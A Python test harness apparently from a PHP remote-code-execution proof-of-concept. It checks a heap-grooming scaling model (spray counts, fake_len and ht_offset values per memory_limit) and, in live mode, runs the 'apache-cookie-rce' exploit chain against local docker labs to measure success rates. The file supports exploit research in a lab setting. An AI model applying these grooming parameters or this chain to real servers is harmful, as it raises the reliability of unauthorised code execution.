#!/usr/bin/env python3
"""Verify the memory_limit groom-scaling model (groom_scaling.py) on 8.4.26/
trixie mod_php (Apache prefork) labs.

Two checks:

  1. MODEL (offline, no lab): assert groom_scaling reproduces the author's
     SIZING_PROFILES table exactly at 8M/128M/256M/512M, that the >=128M
     structural offsets (fake_len/ht_offset) are limit-invariant, and that the
     OOM producers scale linearly.
         python3 -I verify_groom_scaling.py

  2. LIVE (reliability delta): for each (service, port, memory_limit) target,
     run the full RCE exploit N shots TWICE -- once with the baseline 128M groom
     (no --memory-limit) and once with the scaled profile (--memory-limit M) --
     and print RCE success rate before vs after. Labs are the
     docker-compose.apache-avenues.yml --profile memscale set (mem128 :8110 /
     mem256 :8111 / mem512 :8112), all sid_length=32 so only memory_limit
     varies.
         docker compose -f docker-compose.apache-avenues.yml -p p2s-memscale \
             --profile memscale up -d --build
         python3 -I verify_groom_scaling.py --live --shots 8

Model ported from JoasASantos/php2shell-exploit (lib/calibrate.py SIZING_PROFILES).
"""
import argparse
import os
import re
import subprocess
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import groom_scaling as G  # noqa: E402

# The author's SIZING_PROFILES table (verbatim), to assert our port matches.
AUTHOR_TABLE = {
    "8M":   dict(disclose_arm_big=0,   disclose_arm_parts=200,  disclose_arm_fillers128=4,  disclose_arm_burners=5,
                 forge_arm_parts=200,  forge_arm_fillers=30,  fake_len=0x8000,  ht_offset=0x1E398),
    "128M": dict(disclose_arm_big=78,  disclose_arm_parts=860,  disclose_arm_fillers128=14, disclose_arm_burners=20,
                 forge_arm_parts=880,  forge_arm_fillers=115, fake_len=0xC8000, ht_offset=0xF8398),
    "256M": dict(disclose_arm_big=160, disclose_arm_parts=1700, disclose_arm_fillers128=28, disclose_arm_burners=40,
                 forge_arm_parts=1760, forge_arm_fillers=230, fake_len=0xC8000, ht_offset=0xF8398),
    "512M": dict(disclose_arm_big=320, disclose_arm_parts=3400, disclose_arm_fillers128=56, disclose_arm_burners=80,
                 forge_arm_parts=3520, forge_arm_fillers=460, fake_len=0xC8000, ht_offset=0xF8398),
}


def check_model() -> bool:
    ok = True
    print("[model] groom_scaling vs author SIZING_PROFILES")
    for ml, want in AUTHOR_TABLE.items():
        got = G.get_groom_profile(ml)
        for k, v in want.items():
            if got.get(k) != v:
                print(f"  [FAIL] {ml}.{k}: got {got.get(k)!r} want {v!r}")
                ok = False
    if ok:
        print("  [OK] all 4 rows reproduced exactly")

    # Structural offsets limit-invariant for >=128M.
    for ml in ("128M", "256M", "512M"):
        p = G.get_groom_profile(ml)
        if p["fake_len"] != 0xC8000 or p["ht_offset"] != 0xF8398:
            print(f"  [FAIL] {ml} structural offsets drifted")
            ok = False
    # Producers scale ~linearly 128->256->512 (author rounds, e.g. disclose_arm_big
    # 78->160->320, disclose_arm_parts 860->1700->3400), so allow a 6% tolerance.
    b128, b256, b512 = (G.get_groom_profile(m) for m in ("128M", "256M", "512M"))
    for k in ("disclose_arm_big", "disclose_arm_parts", "forge_arm_parts", "forge_arm_fillers", "leak_gfill"):
        if b128[k] == 0:
            continue  # 8M disclose_arm_big is 0; 128M value nonzero here anyway
        r1, r2 = b256[k] / b128[k], b512[k] / b256[k]
        if not (1.9 <= r1 <= 2.1 and 1.9 <= r2 <= 2.1):
            print(f"  [FAIL] {k} not ~2x: {b128[k]}/{b256[k]}/{b512[k]} "
                  f"(ratios {r1:.2f},{r2:.2f})")
            ok = False
    if ok:
        print("  [OK] >=128M offsets invariant; producers scale ~2x per step")
    # 8M is a distinct small-heap layout (different offsets).
    p8 = G.get_groom_profile("8M")
    if p8["ht_offset"] == 0xF8398:
        print("  [FAIL] 8M should use the distinct small-heap ht_offset")
        ok = False
    else:
        print(f"  [OK] 8M distinct layout (ht_offset={p8['ht_offset']:#x}, "
              f"fake_len={p8['fake_len']:#x})")
    return ok


_TALLY_RE = re.compile(r"tally \((\d+) shots\): (.+)")


def _parse_tally(output: str):
    """Return (shots, {label: count}) from the final exploit tally line."""
    shots, counts = 0, {}
    for m in _TALLY_RE.finditer(output):
        shots = int(m.group(1))
        counts = {}
        for part in m.group(2).split(", "):
            if "=" in part:
                lab, _, n = part.partition("=")
                counts[lab.strip()] = int(n)
    return shots, counts


def run_chain(port, service, shots, memory_limit=None, compose_file=None):
    """Run the RCE exploit --measure and return (shots, tally, rce_count)."""
    env = dict(os.environ)
    if compose_file:
        env["COMPOSE_FILE"] = compose_file
    # memscale is in the grouped docker-compose.apache-avenues.yml under
    # the `memscale` profile, isolated as project `p2s-memscale`. php2shell.py
    # shells out to `docker compose` for its restart/exec, so pass the project
    # name + profile through the env (the env-equivalent of
    # `-p p2s-memscale --profile memscale`).
    env["COMPOSE_PROJECT_NAME"] = "p2s-memscale"
    env["COMPOSE_PROFILES"] = "memscale"
    cmd = [sys.executable, "-u", os.path.join(_POC_ROOT, "php2shell.py"), "apache-cookie-rce",
           f"http://127.0.0.1:{port}", "--service", service, "--workers", "1",
           "--measure", "--shots", str(shots), "--restart-each", "--cmd", "id"]
    if memory_limit:
        cmd += ["--memory-limit", memory_limit]
    p = subprocess.run(cmd, capture_output=True, text=True, env=env, timeout=1800)
    out = p.stdout + p.stderr
    s, counts = _parse_tally(out)
    return s, counts, counts.get("RCE", 0), out


def check_live(targets, shots, compose_file):
    print(f"\n[live] reliability delta (N={shots} shots/cell, workers=1, "
          f"restart-each)")
    print(f"{'lab':>8} {'memory_limit':>12} | {'legacy-128M groom':>20} | "
          f"{'scaled groom':>16}")
    print("-" * 70)
    rows = []
    for service, port, ml in targets:
        _, _, rce_legacy, o1 = run_chain(port, service, shots,
                                         memory_limit=None, compose_file=compose_file)
        _, _, rce_scaled, o2 = run_chain(port, service, shots,
                                         memory_limit=ml, compose_file=compose_file)
        rows.append((service, ml, rce_legacy, rce_scaled))
        print(f"{service:>8} {ml:>12} | {rce_legacy:>3}/{shots} "
              f"({100*rce_legacy//shots:>3}%){'':>8} | "
              f"{rce_scaled:>3}/{shots} ({100*rce_scaled//shots:>3}%)")
    return rows


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--live", action="store_true",
                    help="run the full RCE chain against the memscale labs")
    ap.add_argument("--shots", type=int, default=8)
    ap.add_argument("--compose-file", default="docker-compose.apache-avenues.yml")
    ap.add_argument("--targets", default="mem128:8110:128M,mem256:8111:256M",
                    help="comma list of service:port:memory_limit")
    args = ap.parse_args()

    model_ok = check_model()
    if not args.live:
        print("\n(model-only run; pass --live for the reliability delta)")
        sys.exit(0 if model_ok else 1)

    targets = []
    for t in args.targets.split(","):
        svc, port, ml = t.split(":")
        targets.append((svc, int(port), ml))
    check_live(targets, args.shots, args.compose_file)


if __name__ == "__main__":
    main()
